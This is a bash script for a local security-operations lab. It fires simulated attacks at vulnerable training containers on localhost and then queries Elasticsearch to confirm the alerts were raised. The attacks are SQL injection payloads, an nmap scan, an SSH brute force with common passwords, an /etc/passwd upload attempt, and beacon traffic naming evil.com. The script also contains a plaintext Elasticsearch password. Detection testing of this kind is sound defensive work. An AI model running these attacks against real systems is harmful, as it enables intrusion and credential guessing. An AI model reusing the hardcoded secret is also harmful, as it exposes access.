#!/bin/bash
# ================================================================
# SOC Attack Simulation — Test End-to-End Detection
# ================================================================

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; NC='\033[0m'

echo -e "${GREEN}╔════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  SOC Attack Simulation & Alert Testing    ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════╝${NC}"
echo ""

# ── Attack 1: SQL Injection (DVWA) ────────────────────────────
echo -e "${YELLOW}[1/5] SQL Injection Attack (DVWA)${NC}"
echo "  Testing: http://localhost:8890/vulnerabilities/sqli/?id=1' OR '1'='1"
for i in {1..5}; do
  curl -s "http://localhost:8890/vulnerabilities/sqli/?id=1' OR '1'='1 UNION SELECT user(),database()--" > /dev/null
  sleep 1
done
echo -e "${GREEN}  ✓ 5 SQL injection requests sent${NC}"
echo ""

# ── Attack 2: Port Scan (Suricata will detect) ────────────────
echo -e "${YELLOW}[2/5] Port Scan from Kali (Suricata detection)${NC}"
echo "  Testing: nmap -p 1-1000 localhost (from kali-attacker)"
docker exec kali-attacker bash -c "nmap -p 1-1000 localhost 2>/dev/null | grep 'Nmap scan report' && echo '  ✓ Port scan executed'" 2>/dev/null || echo "  ⚠ nmap not available in kali container"
echo ""

# ── Attack 3: SSH Brute Force (victim-ubuntu) ────────────────
echo -e "${YELLOW}[3/5] SSH Brute Force Attack${NC}"
echo "  Testing: SSH login attempts with common passwords"
for pass in password123 admin root 12345; do
  timeout 2 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 ubuntu@localhost -p 2222 "id" 2>/dev/null &
  sleep 0.5
done
echo -e "${GREEN}  ✓ 4 SSH brute force attempts sent${NC}"
echo ""

# ── Attack 4: Web Shell Upload (bWAPP) ───────────────────────
echo -e "${YELLOW}[4/5] File Upload Attack (bWAPP)${NC}"
echo "  Testing: http://localhost:8892/upload.php"
curl -s -F "file=@/etc/passwd" "http://localhost:8892/upload.php" > /dev/null 2>&1 || \
curl -s "http://localhost:8892/?action=upload" > /dev/null
echo -e "${GREEN}  ✓ File upload request sent${NC}"
echo ""

# ── Attack 5: C2 Beacon Simulation ──────────────────────────
echo -e "${YELLOW}[5/5] C2 Beacon-like HTTP Traffic${NC}"
echo "  Testing: Suspicious HTTP headers and URIs"
for i in {1..3}; do
  curl -s -A "Beacon" -H "X-C2: evil.com" "http://localhost:8891/api/command" 2>/dev/null
  sleep 1
done
echo -e "${GREEN}  ✓ C2-like requests sent${NC}"
echo ""

# ── Wait for alerts to process ───────────────────────────────
echo -e "${YELLOW}Waiting 30s for ElastAlert to process attacks...${NC}"
sleep 30

# ── Check Elasticsearch for alerts ───────────────────────────
echo ""
echo -e "${GREEN}═══ CHECKING ELASTICSEARCH FOR ALERTS ═══${NC}"
echo ""

TOKEN=$(curl -sk -u "elastic:sYVfKJCe2RCfELjf=GLa" \
  "http://localhost:9200/_security/oauth2/token?grant_type=client_credentials" 2>/dev/null | \
  grep -oP '"access_token":"\K[^"]*' || echo "")

# Query ElastAlert status index
echo "ElastAlert Recent Alerts:"
curl -s -u elastic:sYVfKJCe2RCfELjf=GLa \
  "http://localhost:9200/elastalert_status/_search?size=10&sort=timestamp:desc" \
  -H "Content-Type: application/json" \
  -d '{"query":{"range":{"timestamp":{"gte":"now-5m"}}}}' 2>/dev/null | \
  python3 -c "
import sys,json
try:
  d=json.load(sys.stdin)
  hits=d.get('hits',{}).get('hits',[])
  if not hits:
    print('  (No alerts yet - check Slack or wait longer)')
  for hit in hits:
    alert=hit['_source']
    print(f'  ✓ {alert.get(\"rule_name\",\"?\")}: {alert.get(\"message\",\"?\")}')
except:
  pass
" 2>/dev/null

# ── Check Kibana Dashboards ──────────────────────────────────
echo ""
echo -e "${GREEN}═══ OPEN DASHBOARDS TO VERIFY DETECTIONS ═══${NC}"
echo ""
echo "1. Kibana Alerts Dashboard:"
echo "   http://localhost:5601/app/security/alerts"
echo ""
echo "2. Wazuh Dashboard:"
echo "   docker exec wazuh-manager /var/ossec/bin/agent_control -l"
echo ""
echo "3. Check Slack:"
echo "   Alerts should appear in Slack #alerts channel"
echo ""
echo -e "${GREEN}✓ SOC Attack Test Complete!${NC}"
